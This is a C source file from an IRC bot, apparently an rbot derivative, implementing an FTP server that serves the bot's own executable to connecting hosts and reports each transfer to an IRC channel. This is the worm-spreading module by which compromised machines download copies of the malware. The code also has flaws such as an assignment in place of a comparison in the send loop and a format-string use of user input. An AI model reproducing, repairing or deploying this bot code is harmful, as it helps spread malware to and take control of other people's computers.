#include "include.h"

#ifndef NO_FTPD

// This is multithreaded FTP. Original one by dobe didn't work well
// so i combined it with rbot's FTP.
SOCKET data_sock;
DWORD WINAPI FTPDHandler(LPVOID param);
int Ftp_data_transfer();
int ftp_Data_connect(char *ip,int port);

DWORD WINAPI FTPD(LPVOID param) {

//	BOOL bOptVal = TRUE;
	DWORD dwID = 0;
//	WSADATA wsdata;

	int on;

	FTP ftps1 = *((FTP *)param);
	FTP *ftps1s = (FTP *)param;
	ftps1s->GotInfo = TRUE;

//	int bOptLen = sizeof(BOOL), iOptVal, iOptLen = sizeof(int);
	register int i;
	SOCKET sock, consock;
	struct sockaddr_in sin;
	unsigned long mode = 1;

/*#ifdef DEBUG
	printf("Starting FTPD server.\n");
#endif*/

//	WSAStartup(0x0101, &wsdata);

	sin.sin_family = AF_INET;
	sin.sin_addr.s_addr = 0;
	sin.sin_port = htons(FTPPort);
	i = sizeof(sin);
	sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock == INVALID_SOCKET) {
#ifdef DEBUG
		printf("FTP Socket error.\n");
#endif
		ClearThread(ftps1.ThreadNum);
		ExitThread(0);
	}

	setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, (char *) &on, sizeof(on));
//	setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, (char *)&iOptVal, iOptLen);
//	ioctlsocket(sock, FIONBIO, &mode);
	if (bind(sock, (struct sockaddr *)&sin, i) == SOCKET_ERROR) {
#ifdef DEBUG
		printf("FTP Bind error.\n");
#endif
		ClearThread(ftps1.ThreadNum);
		ExitThread(0);
	}
	

	listen(sock, 10);

	while (1) {
		consock = accept(sock, (struct sockaddr *)&sin, &i);
		if (consock != INVALID_SOCKET) {
			FTPT ftps;
			ftps.ircsock = ftps1.ircsock;
			ftps.consock = consock;
			ftps.ThreadNum = AddThread(FTPTRANS_THREAD);

			if (ftps.ThreadNum > 0) {
				Thread[ftps.ThreadNum].tHandle = CreateThread(NULL, 0, FTPDHandler, &ftps, 0, &dwID);
				Sleep(50);
				//while(ftps.GotInfo == FALSE)
				//	Sleep(30);
			}
		}
		Sleep(500);
	}
	closesocket(consock);
	closesocket(sock);
	ClearThread(ftps1.ThreadNum);
	ExitThread(0);
}

DWORD WINAPI FTPDHandler(LPVOID param) 
{
	char szBuffer[100], szParam1[32], szParam2[32], szParam3[32], Buffer[MAX_LINE_SIZE];

	char a[4];
	char b[4];
	char c[4];
	char d[4];
	char p1[50];
	char p2[50];
	char tmpip[15];
	int po,po2;
	long h;

	FTPT ftps = *((FTPT *)param);
	FTPT *ftpss = (FTPT *)param;
	ftpss->GotInfo = TRUE;

	int iRecvd;
	SOCKET consock = ftps.consock;

#ifndef NO_DEBUG
	printf("Starting FTPD handling thread.\n");
#endif

	send(consock, "220 Hello!\r\n", 12, 0);
	while (1) {
		iRecvd = recv(consock, szBuffer, sizeof(szBuffer) - 1, 0);
		szBuffer[iRecvd] = '\0';
		sscanf(szBuffer, "%s %s", szParam1, szParam2);
		if (strcmp(szParam1, "USER") == 0) {
			sprintf(szParam3, szParam2);
			sprintf(szBuffer, "331 Password required for %s.\r\n", szParam2);
			send(consock, szBuffer, strlen(szBuffer), 0);
		}
		else if (strcmp(szParam1, "PASS") == 0) {
			if ((strcmp(szParam2, FTPPass) == 0) && (strcmp(szParam3, FTPUser) == 0)) {
				sprintf(szBuffer, "230 User %s logged in.\r\n", szParam3);
				send(consock, szBuffer, strlen(szBuffer), 0);
			} else {
				send(consock, "530 Login or Password incorrect.\r\n", 34, 0);
				break;
			}
		}
		else if ((strcmp(szParam1, "TYPE") == 0) && (strcmp(szParam2, "A") == 0))
			send(consock, "200 TYPE is now ASCII.\r\n", 24, 0);
		else if (strcmp(szParam1, "SYST") == 0)
			send(consock, "215 UNIX Type: L8.\r\n", 20, 0);	
		else if (strcmp(szParam1, "PORT") == 0) {
			sscanf(szBuffer,"%*s %[^,],%[^,],%[^,],%[^,],%[^,],%[^\n]",a,b,c,d,p1,p2);
			po = atoi(p1);
			po2 = atoi(p2);
			memset(p1,0,sizeof(p1));
			sprintf(p1,"%x%x\n",po,po2);
			h = strtoul(p1, NULL, 16);
			sprintf(tmpip,"%s.%s.%s.%s",a,b,c,d);
			send(consock, "200 PORT command successful.\r\n", 30, 0);	
		}
		else if (strcmp(szParam1, "RETR") == 0) {	
			send(consock,"150 Opening BINARY mode data connection.\r\n",42 , 0);
			//Sleep(500);
			_snprintf(Buffer, sizeof(Buffer), "Starting transfer to: %s.", tmpip);
			IrcPrivmsg(ftps.ircsock, TransferChannel, Buffer);
			memset(Buffer, 0, sizeof(Buffer));
#ifdef DEBUG
			printf("Port binded\n");
#endif
			Sleep(500);
			if(ftp_Data_connect(tmpip,(int)h) == 1) {
				if (Ftp_data_transfer() == 1) {
					send(consock,"226 Transfer ok.\r\n", 18 , 0);
					TotalTransfers++;
					_snprintf(Buffer, sizeof(Buffer), "Sent: %s. Total: %d.", tmpip, TotalTransfers);
					IrcPrivmsg(ftps.ircsock, TransferChannel, Buffer);
					memset(Buffer, 0, sizeof(Buffer));				
				}
				break;
			} else {
				send(consock,"425 Can't open data connection.\r\n", 33, 0);
				break;
			}
		}
		else if (strcmp(szParam1, "STOR") == 0)
			send(consock, "500 Command Not Supported.\r\n", 28, 0);
		else if (strcmp(szParam1, "QUIT") == 0)	{
			send(consock,"221 Bye.\r\n", 10 , 0);
			break;
		}
		else if (szParam1 != NULL) break;
	}
	closesocket(consock);
	ClearThread(ftps.ThreadNum);
	ExitThread(0);
}

int ftp_Data_connect(char *ip,int port)
{
	struct	sockaddr_in	server;
//	int fodder;
//	WSADATA wsdata;

//	WSAStartup(0x0101, &wsdata);

	server.sin_family = AF_INET;
	server.sin_addr.s_addr = inet_addr(ip);
    server.sin_port = htons(port);

	data_sock = socket(AF_INET, SOCK_STREAM, 0);

//	setsockopt(data_sock, SOL_SOCKET, SO_REUSEADDR, (char *) &fodder, sizeof fodder);

	if (connect(data_sock,(struct sockaddr *)&server, sizeof(struct sockaddr)) == -1) {
		closesocket(data_sock);
//		WSACleanup();
		return 0;
	}
	return 1;
}

int Ftp_data_transfer() {
	unsigned char fileBuf[4096]; FILE *fp=NULL;
	char myfname[MAX_PATH];
	int count=4096;
	GetModuleFileName(NULL,myfname,sizeof(myfname));
	fp=fopen(myfname, "rb");
#ifdef DEBUG
	printf("File opened: %s\n", myfname);
#endif
	if (fp) {
		fseek(fp, 0, SEEK_END); long filesize=ftell(fp); fseek(fp, 0, SEEK_SET);
		int written=0;
		while(!feof(fp)) {
			written=0;
			int retval; memset(fileBuf, 0, sizeof(fileBuf));
			count=fread(fileBuf, sizeof(char), 2048, fp);
			if(ferror(fp)) break;
			while(written<count) {
				retval = send(data_sock, (char*)fileBuf, count, 0);
				if (retval = SOCKET_ERROR)
					break;
				written+=retval;
			}
		}
	}
#ifdef DEBUG
	printf("Finished sending file: %s\n", myfname);
#endif
	fclose(fp);
	closesocket(data_sock);
//	WSACleanup();
	return 1;
}

#endif
